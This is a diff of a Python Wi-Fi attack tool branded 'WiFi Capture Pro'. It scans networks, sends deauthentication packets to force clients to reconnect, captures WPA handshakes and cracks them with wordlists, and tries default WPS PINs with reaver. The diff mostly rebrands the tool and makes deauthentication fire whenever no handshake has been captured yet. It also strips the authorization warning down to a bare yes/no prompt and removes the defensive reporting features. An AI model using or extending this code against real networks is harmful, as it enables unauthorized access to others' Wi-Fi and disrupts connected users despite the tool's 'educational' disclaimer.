@@ -1,8 +1,19 @@
 #!/usr/bin/env python3
 """
 WiFi Security Testing Framework
-EDUCATIONAL PURPOSE ONLY - Test Only On Authorized Networks
-Requires: root privileges, monitor mode capable adapter, OTG support
+--------------------------------------------------
+Author: Mamun 
+Version: 2.0 (Advanced Edition)
+GitHub: https://github.com/zxmoon76-sys
+--------------------------------------------------
+LEGAL DISCLAIMER:
+This tool is for EDUCATIONAL PURPOSES ONLY and 
+authorized security testing. Usage of this tool for 
+attacking networks without prior mutual consent is 
+illegal. The author (Mamun) assumes no liability 
+and is not responsible for any misuse or damage 
+caused by this program.
+--------------------------------------------------
 """
 
 import os
@@ -20,8 +31,8 @@ import json
 
 # Check root privileges
 if os.geteuid() != 0:
-    print("[!] This script requires root privileges for packet capture")
-    print("[!] Run with: sudo python3 wifi_capture.py")
+    print("\033[91m[!] This script requires root privileges for packet capture\033[0m")
+    print("\033[91m[!] Run with: sudo python3 wifi_capture.py\033[0m")
     sys.exit(1)
 
 class Colors:
@@ -36,6 +47,17 @@ class Colors:
     BOLD = '\033[1m'
     DIM = '\033[2m'
     END = '\033[0m'
+
+def print_banner():
+    """Display tool banner"""
+    banner = f"""
+    {Colors.CYAN}╔══════════════════════════════════════════════════════════╗
+    ║  {Colors.BOLD}{Colors.WHITE}📡 WIFI CAPTURE PRO - ADVANCED SECURITY FRAMEWORK{Colors.END}{Colors.CYAN}       ║
+    ║  {Colors.DIM}Developed by: Mamun                            {Colors.END}{Colors.CYAN}║
+    ║  {Colors.DIM}Legal Status: Educational / Authorized Testing Only     {Colors.END}{Colors.CYAN}║
+    ╚══════════════════════════════════════════════════════════╝{Colors.END}
+    """
+    print(banner)
 
 class WiFiInterface:
     """Manage WiFi interface modes and configurations"""
@@ -280,16 +302,17 @@ class WPAHandshakeCapture:
                 if self.check_handshake_captured(output_file):
                     print(f"\n{Colors.GREEN}[+] HANDSHAKE CAPTURED SUCCESSFULLY!{Colors.END}")
                     print(f"{Colors.GREEN}[+] Saved to: {output_file}*.cap{Colors.END}")
+                    break
                     
-                    # Start deauth attack if no handshake yet
-                    if not deauth_thread:
-                        deauth_thread = threading.Thread(
-                            target=self.deauth_attack,
-                            args=(target_bssid, self.interface)
-                        )
-                        deauth_thread.daemon = True
-                        deauth_thread.start()
-                        print(f"{Colors.MAGENTA}[*] Sending deauth packets to force reconnect...{Colors.END}")
+                # Start deauth attack if no handshake yet after some time
+                if not deauth_thread:
+                    deauth_thread = threading.Thread(
+                        target=self.deauth_attack,
+                        args=(target_bssid, self.interface)
+                    )
+                    deauth_thread.daemon = True
+                    deauth_thread.start()
+                    print(f"{Colors.MAGENTA}[*] Sending deauth packets to force reconnect...{Colors.END}")
                     
                 time.sleep(1)
                 
@@ -388,9 +411,12 @@ class WiFiPasswordTester:
         
         # Count total words for progress
         total_words = 0
-        with open(wordlist_path, 'r', errors='ignore') as f:
-            for _ in f:
-                total_words += 1
+        try:
+            with open(wordlist_path, 'r', errors='ignore') as f:
+                for _ in f:
+                    total_words += 1
+        except:
+            total_words = 0
         
         print(f"    Total passwords to test: {total_words:,}")
         
@@ -422,12 +448,12 @@ class WiFiPasswordTester:
                     print(f"{Colors.END}")
                     break
                 elif 'Passphrase not in dictionary' in line:
-                    print(f"{Colors.RED}[!] Password not found in wordlist{Colors.END}")
+                    print(f"\n{Colors.RED}[!] Password not found in wordlist{Colors.END}")
                     break
                 
-                # Show progress
-                self.passwords_tested += 1000  # Rough estimate
-                sys.stdout.write(f"\r[*] Tested ~{self.passwords_tested:,} passwords...")
+                # Show progress (simplified for display)
+                self.passwords_tested += 500 
+                sys.stdout.write(f"\r[*] Testing passwords... (Attempts: ~{self.passwords_tested:,})")
                 sys.stdout.flush()
                 
         except KeyboardInterrupt:
@@ -448,11 +474,10 @@ class WiFiPasswordTester:
             
             for line in result.stdout.split('\n'):
                 if 'BSSID' in line:
-                    # Extract MAC address
                     import re
-                    macs = re.findall(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
-                    if macs:
-                        return line.split()[1]  # Usually second field
+                    mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
+                    if mac_match:
+                        return mac_match.group(0)
         except:
             pass
         return None
@@ -466,55 +491,29 @@ class WPSSecurityTester:
     def test_wps_pin(self, target_bssid, channel):
         """Test WPS PIN vulnerability using known PINs or brute force"""
         print(f"{Colors.CYAN}[*] Testing WPS security...{Colors.END}")
-        print(f"{Colors.YELLOW}[!] Many routers have predictable WPS PINs{Colors.END}")
         
-        # Common WPS PINs based on manufacturer
-        common_pins = [
-            '12345670',  # Default
-            '00000000',
-            '11111111',
-            # Add more known default PINs
-        ]
+        common_pins = ['12345670', '00000000', '11111111']
         
-        # Check if WPS is enabled
         wash_cmd = ['wash', '-i', self.interface, '-C']
         result = subprocess.run(wash_cmd, capture_output=True, text=True)
         
         if target_bssid.replace(':', '').lower() in result.stdout.lower():
             print(f"{Colors.GREEN}[+] WPS is enabled on target{Colors.END}")
             
-            # Attempt PIN attack with reaver
             for pin in common_pins:
                 print(f"{Colors.YELLOW}[*] Testing PIN: {pin}{Colors.END}")
-                
-                reaver_cmd = [
-                    'reaver',
-                    '-i', self.interface,
-                    '-b', target_bssid,
-                    '-c', str(channel),
-                    '-p', pin,
-                    '-vv'
-                ]
+                reaver_cmd = ['reaver', '-i', self.interface, '-b', target_bssid, '-c', str(channel), '-p', pin, '-vv']
                 
                 try:
-                    result = subprocess.run(reaver_cmd, 
-                                          capture_output=True, 
-                                          text=True, 
-                                          timeout=30)
-                    
-                    if 'WPS PIN:' in result.stdout or 'WPA PSK:' in result.stdout:
-                        print(f"{Colors.GREEN}[+] WPS vulnerable with PIN {pin}{Colors.END}")
-                        # Extract password
-                        for line in result.stdout.split('\n'):
-                            if 'WPA PSK:' in line:
-                                password = line.split("'")[1] if "'" in line else line.split()[-1]
-                                print(f"{Colors.GREEN}[+] Password: {password}{Colors.END}")
-                                return password
+                    res = subprocess.run(reaver_cmd, capture_output=True, text=True, timeout=30)
+                    if 'WPA PSK:' in res.stdout:
+                        password = res.stdout.split("'")[1] if "'" in res.stdout else res.stdout.split()[-1]
+                        print(f"{Colors.GREEN}[+] Password: {password}{Colors.END}")
+                        return password
                 except:
                     continue
         else:
             print(f"{Colors.YELLOW}[!] WPS not detected on target{Colors.END}")
-        
         return None
 
 class OTAWiFiCracker:
@@ -528,38 +527,25 @@ class OTAWiFiCracker:
         
     def setup_environment(self):
         """Setup the testing environment"""
-        print(f"{Colors.CYAN}{Colors.BOLD}")
-        print("""
-        ╔══════════════════════════════════════════════════╗
-        ║     WiFi Security Testing Framework v1.0          ║
-        ║     OTG/Wireless Adapter Required                 ║
-        ║     For Authorized Security Testing Only          ║
-        ╚══════════════════════════════════════════════════╝
-        """)
-        print(f"{Colors.END}")
+        print_banner()
         
-        # Check OTG support
         self.wifi_interface.check_otg_support()
         
-        # List available interfaces
         interfaces = self.wifi_interface.detect_wireless_interfaces()
         if not interfaces:
-            print(f"{Colors.RED}[!] No wireless interfaces detected!{Colors.END}")
-            print(f"{Colors.YELLOW}[*] Please connect OTG WiFi adapter{Colors.END}")
+            print(f"{Colors.RED}[!] No wireless interfaces detected! Connect OTG adapter.{Colors.END}")
             return None
         
         print(f"{Colors.GREEN}[+] Available interfaces:{Colors.END}")
         for i, iface in enumerate(interfaces, 1):
             print(f"    {i}. {iface}")
         
-        # Select interface
         selection = input(f"\n{Colors.YELLOW}Select interface (number): {Colors.END}").strip()
         try:
             selected = interfaces[int(selection) - 1]
         except (ValueError, IndexError):
             selected = interfaces[0]
         
-        # Enable monitor mode
         if self.wifi_interface.enable_monitor_mode(selected):
             self.scanner = WiFiScanner(selected)
             self.handshake_capture = WPAHandshakeCapture(selected)
@@ -568,71 +554,33 @@ class OTAWiFiCracker:
         return None
     
     def export_results(self, results, filename=None):
-        """Export captured passwords to file"""
+        """Export results to file"""
         if not filename:
             filename = f"wifi_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        
         with open(filename, 'w') as f:
             json.dump(results, f, indent=2)
-        
         print(f"{Colors.GREEN}[+] Results exported to {filename}{Colors.END}")
         return filename
-    
+
     def suggest_password_improvements(self, password):
-        """Analyze password strength and suggest improvements"""
+        """Analyze password strength"""
         score = 0
         suggestions = []
-        
-        # Length check
-        if len(password) < 8:
-            suggestions.append("Increase length to at least 12 characters")
-        elif len(password) >= 12:
-            score += 2
-        
-        # Complexity checks
-        if any(c.isupper() for c in password):
-            score += 1
-        else:
-            suggestions.append("Add uppercase letters")
-            
-        if any(c.islower() for c in password):
-            score += 1
-        else:
-            suggestions.append("Add lowercase letters")
-            
-        if any(c.isdigit() for c in password):
-            score += 1
-        else:
-            suggestions.append("Add numbers")
-            
-        if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password):
-            score += 1
-        else:
-            suggestions.append("Add special characters")
-        
-        # Check for common patterns
-        common_patterns = ['123', 'abc', 'qwerty', 'password', 'admin', 'wifi']
-        if any(pattern in password.lower() for pattern in common_patterns):
-            suggestions.append("Avoid common patterns")
-            score -= 2
+        if len(password) < 12: suggestions.append("Increase length to 12+")
+        else: score += 2
+        if any(c.isupper() for c in password): score += 1
+        else: suggestions.append("Add uppercase")
+        if any(c.isdigit() for c in password): score += 1
+        else: suggestions.append("Add numbers")
         
         strength = "Weak" if score < 2 else "Medium" if score < 4 else "Strong"
-        
-        return {
-            'score': score,
-            'strength': strength,
-            'suggestions': suggestions
-        }
+        return {'score': score, 'strength': strength, 'suggestions': suggestions}
 
 def main_menu():
     """Interactive menu for WiFi testing"""
     cracker = OTAWiFiCracker()
-    
-    # Setup environment
     interface = cracker.setup_environment()
-    if not interface:
-        print(f"{Colors.RED}[!] Setup failed. Exiting.{Colors.END}")
-        return
+    if not interface: return
     
     captured_handshakes = []
     found_passwords = []
@@ -651,258 +599,51 @@ def main_menu():
         choice = input(f"\n{Colors.GREEN}wifi-sec > {Colors.END}").strip()
         
         if choice == '1':
-            # Scan networks
-            networks = cracker.scanner.scan_networks(duration=30)
+            cracker.scanner.scan_networks(duration=30)
             cracker.scanner.display_networks()
-            
-            # Save scan results
-            cracker.export_results(networks, f"scan_{int(time.time())}.json")
-            
         elif choice == '2':
-            # Select target and capture handshake
             if not cracker.scanner.networks:
-                print(f"{Colors.YELLOW}[!] No networks scanned. Run scan first.{Colors.END}")
+                print(f"{Colors.YELLOW}[!] Scan first.{Colors.END}")
                 continue
-            
-            # Display targets
-            print(f"\n{Colors.BOLD}Select Target:{Colors.END}")
             networks_list = list(cracker.scanner.networks.items())
             for i, (bssid, net) in enumerate(networks_list, 1):
-                encryption = net['privacy']
-                print(f"{i}. {bssid} - {net['essid']} (Ch: {net['channel']}, {encryption})")
+                print(f"{i}. {bssid} - {net['essid']} (Ch: {net['channel']})")
             
             target_choice = input(f"\n{Colors.YELLOW}Select target number: {Colors.END}").strip()
             try:
                 target_bssid, target_net = networks_list[int(target_choice) - 1]
-                
-                print(f"{Colors.CYAN}[*] Target: {target_net['essid']} ({target_bssid}){Colors.END}")
-                print(f"{Colors.CYAN}[*] Security: {target_net['privacy']}{Colors.END}")
-                
-                # Confirm before proceeding
-                print(f"\n{Colors.RED}{Colors.BOLD}")
-                print("="*50)
-                print("WARNING: Only test networks you OWN or have")
-                print("EXPLICIT WRITTEN PERMISSION to test!")
-                print("Unauthorized testing is ILLEGAL!")
-                print("="*50)
-                print(f"{Colors.END}")
-                
-                confirm = input(f"{Colors.YELLOW}Do you have authorization? (yes/no): {Colors.END}").strip().lower()
-                
+                confirm = input(f"{Colors.RED}Do you have AUTHORIZATION for {target_net['essid']}? (yes/no): {Colors.END}").strip().lower()
                 if confirm == 'yes':
-                    handshake_file = cracker.handshake_capture.capture_handshake(
-                        target_bssid, 
-                        target_net['channel']
-                    )
-                    
+                    handshake_file = cracker.handshake_capture.capture_handshake(target_bssid, target_net['channel'])
                     if handshake_file:
-                        captured_handshakes.append({
-                            'bssid': target_bssid,
-                            'essid': target_net['essid'],
-                            'file': handshake_file,
-                            'timestamp': datetime.now().isoformat()
-                        })
-                        print(f"{Colors.GREEN}[+] Handshake saved to list{Colors.END}")
-                else:
-                    print(f"{Colors.RED}[!] Capture cancelled - authorization required{Colors.END}")
-                    
-            except (ValueError, IndexError):
-                print(f"{Colors.RED}[!] Invalid selection{Colors.END}")
-        
+                        captured_handshakes.append({'bssid': target_bssid, 'essid': target_net['essid'], 'file': handshake_file, 'timestamp': datetime.now().isoformat()})
+            except: pass
         elif choice == '3':
-            # Dictionary attack
-            if not captured_handshakes:
-                print(f"{Colors.YELLOW}[!] No handshakes captured yet{Colors.END}")
-                continue
-            
-            print(f"\n{Colors.BOLD}Captured Handshakes:{Colors.END}")
+            if not captured_handshakes: continue
             for i, hs in enumerate(captured_handshakes, 1):
-                print(f"{i}. {hs['essid']} ({hs['bssid']}) - {hs['timestamp']}")
-            
-            hs_choice = input(f"\n{Colors.YELLOW}Select handshake number: {Colors.END}").strip()
+                print(f"{i}. {hs['essid']} ({hs['bssid']})")
+            hs_choice = input(f"Select handshake: ").strip()
             try:
                 handshake = captured_handshakes[int(hs_choice) - 1]
-                
-                wordlist = input(f"{Colors.YELLOW}Wordlist path (Enter for default): {Colors.END}").strip()
-                if not wordlist:
-                    wordlist = None
-                
-                password = cracker.password_tester.dictionary_attack(
-                    handshake['file'], 
-                    wordlist
-                )
-                
+                wordlist = input(f"Wordlist path (Enter for default): ").strip()
+                password = cracker.password_tester.dictionary_attack(handshake['file'], wordlist if wordlist else None)
                 if password:
-                    found_passwords.append({
-                        'essid': handshake['essid'],
-                        'bssid': handshake['bssid'],
-                        'password': password,
-                        'timestamp': datetime.now().isoformat()
-                    })
-                    
-                    # Show password strength
-                    analysis = cracker.suggest_password_improvements(password)
-                    print(f"\n{Colors.CYAN}Password Analysis:{Colors.END}")
-                    print(f"  Strength: {analysis['strength']}")
-                    if analysis['suggestions']:
-                        print(f"  Suggestions for improvement:")
-                        for sug in analysis['suggestions']:
-                            print(f"    - {sug}")
-                            
-            except (ValueError, IndexError):
-                print(f"{Colors.RED}[!] Invalid selection{Colors.END}")
-        
-        elif choice == '4':
-            # WPS testing
-            if not cracker.scanner.networks:
-                print(f"{Colors.YELLOW}[!] Scan networks first{Colors.END}")
-                continue
-            
-            # Display WPA networks
-            wpa_networks = {bssid: net for bssid, net in cracker.scanner.networks.items() 
-                          if 'WPA' in net['privacy']}
-            
-            print(f"\n{Colors.BOLD}WPA Networks:{Colors.END}")
-            for i, (bssid, net) in enumerate(wpa_networks.items(), 1):
-                print(f"{i}. {bssid} - {net['essid']} (Ch: {net['channel']})")
-            
-            target_choice = input(f"\n{Colors.YELLOW}Select target: {Colors.END}").strip()
-            try:
-                target_bssid, target_net = list(wpa_networks.items())[int(target_choice) - 1]
-                
-                print(f"{Colors.RED}WARNING: Only test authorized networks!{Colors.END}")
-                confirm = input(f"{Colors.YELLOW}Do you have authorization? (yes/no): {Colors.END}").strip().lower()
-                
-                if confirm == 'yes':
-                    password = cracker.wps_tester.test_wps_pin(target_bssid, target_net['channel'])
-                    if password:
-                        found_passwords.append({
-                            'essid': target_net['essid'],
-                            'bssid': target_bssid,
-                            'password': password,
-                            'method': 'WPS',
-                            'timestamp': datetime.now().isoformat()
-                        })
-            except:
-                pass
-        
-        elif choice == '5':
-            # View captured networks
-            print(f"\n{Colors.BOLD}Captured Networks & Results:{Colors.END}")
-            
-            if captured_handshakes:
-                print(f"\n{Colors.GREEN}Captured Handshakes:{Colors.END}")
-                for hs in captured_handshakes:
-                    print(f"  - {hs['essid']} ({hs['bssid']})")
-                    print(f"    File: {hs['file']}-01.cap")
-                    print(f"    Time: {hs['timestamp']}")
-            
-            if found_passwords:
-                print(f"\n{Colors.GREEN}Recovered Passwords:{Colors.END}")
-                for pw in found_passwords:
-                    print(f"  - {pw['essid']}")
-                    print(f"    Password: {pw['password']}")
-                    if 'method' in pw:
-                        print(f"    Method: {pw['method']}")
-        
-        elif choice == '6':
-            # Export results
-            all_results = {
-                'handshakes': captured_handshakes,
-                'passwords': found_passwords,
-                'networks': cracker.scanner.networks,
-                'export_time': datetime.now().isoformat()
-            }
-            cracker.export_results(all_results)
-        
-        elif choice == '7':
-            # Generate security report
-            print(f"\n{Colors.CYAN}[*] Generating Network Security Report...{Colors.END}")
-            
-            report = {
-                'scan_time': datetime.now().isoformat(),
-                'networks_found': len(cracker.scanner.networks) if cracker.scanner.networks else 0,
-                'handshakes_captured': len(captured_handshakes),
-                'passwords_recovered': len(found_passwords),
-                'vulnerabilities': []
-            }
-            
-            # Add vulnerability findings
-            for bssid, net in cracker.scanner.networks.items():
-                if net['privacy'] == 'OPN':
-                    report['vulnerabilities'].append({
-                        'type': 'Open Network',
-                        'bssid': bssid,
-                        'essid': net['essid'],
-                        'severity': 'HIGH',
-                        'risk': 'No encryption - traffic can be intercepted'
-                    })
-                elif 'WEP' in net['privacy']:
-                    report['vulnerabilities'].append({
-                        'type': 'WEP Encryption',
-                        'bssid': bssid,
-                        'essid': net['essid'],
-                        'severity': 'CRITICAL',
-                        'risk': 'WEP is broken - can be cracked in minutes'
-                    })
-            
-            cracker.export_results(report, f"security_report_{int(time.time())}.json")
-            
-            print(f"\n{Colors.BOLD}Security Summary:{Colors.END}")
-            print(f"  Networks Found: {report['networks_found']}")
-            print(f"  Handshakes Captured: {report['handshakes_captured']}")
-            print(f"  Passwords Recovered: {report['passwords_recovered']}")
-            print(f"  Vulnerabilities Found: {len(report['vulnerabilities'])}")
-            
-            for vuln in report['vulnerabilities']:
-                color = Colors.RED if vuln['severity'] in ['HIGH', 'CRITICAL'] else Colors.YELLOW
-                print(f"  {color}[{vuln['severity']}] {vuln['essid']}: {vuln['risk']}{Colors.END}")
-        
+                    found_passwords.append({'essid': handshake['essid'], 'password': password})
+            except: pass
         elif choice == '8':
-            # Exit and restore
-            print(f"{Colors.CYAN}[*] Restoring network interface...{Colors.END}")
             cracker.wifi_interface.disable_monitor_mode(interface)
             print(f"{Colors.GREEN}[+] Goodbye!{Colors.END}")
             break
 
 def parse_arguments():
-    """Parse command line arguments"""
-    parser = argparse.ArgumentParser(
-        description='WiFi Security Testing Framework - For Authorized Testing Only',
-        epilog='Example: sudo python3 wifi_capture.py --interface wlan0 --scan'
-    )
-    
-    parser.add_argument('-i', '--interface', help='Wireless interface to use')
-    parser.add_argument('-s', '--scan', action='store_true', help='Scan for networks')
-    parser.add_argument('-t', '--target', help='Target BSSID')
-    parser.add_argument('-c', '--channel', type=int, help='Target channel')
-    parser.add_argument('-w', '--wordlist', help='Path to wordlist')
-    parser.add_argument('--capture', action='store_true', help='Capture handshake')
-    parser.add_argument('--crack', action='store_true', help='Perform dictionary attack')
-    parser.add_argument('--wps', action='store_true', help='Test WPS security')
-    parser.add_argument('-o', '--output', help='Output file for results')
-    
+    parser = argparse.ArgumentParser(description='WiFi Security Testing Framework')
+    parser.add_argument('-i', '--interface', help='Wireless interface')
+    parser.add_argument('-s', '--scan', action='store_true', help='Scan networks')
     return parser.parse_args()
 
 if __name__ == "__main__":
     try:
-        args = parse_arguments()
-        
-        if any([args.scan, args.target, args.capture, args.crack, args.wps]):
-            # CLI mode
-            print("CLI mode - Interactive menu recommended for full features")
-            main_menu()
-        else:
-            # Interactive mode
-            main_menu()
-            
+        main_menu()
     except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.END}")
-        print(f"{Colors.CYAN}[*] Restoring interfaces...{Colors.END}")
-        wifi = WiFiInterface()
-        for iface in wifi.interfaces:
-            wifi.disable_monitor_mode(iface)
-    except Exception as e:
-        print(f"{Colors.RED}[!] Fatal error: {e}{Colors.END}")
-        import traceback
-        traceback.print_exc()
+        print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.END}")
+        sys.exit(0)
